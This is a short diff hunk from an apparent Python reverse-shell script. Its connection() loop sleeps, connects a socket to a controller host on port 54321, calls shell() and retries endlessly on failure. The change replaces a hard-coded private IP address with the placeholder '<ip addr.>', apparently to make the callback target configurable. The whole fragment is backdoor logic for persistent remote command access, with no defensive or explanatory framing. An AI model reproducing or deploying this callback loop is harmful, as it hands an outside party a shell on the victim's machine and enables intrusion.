@@ -43,7 +43,7 @@ def connection():
 	while True:
 		time.sleep(30)
 		try:
-			sock.connect(("192.168.1.9",54321))
+			sock.connect(("<ip addr.>",54321))
 			shell()
 		except:
 			connection()
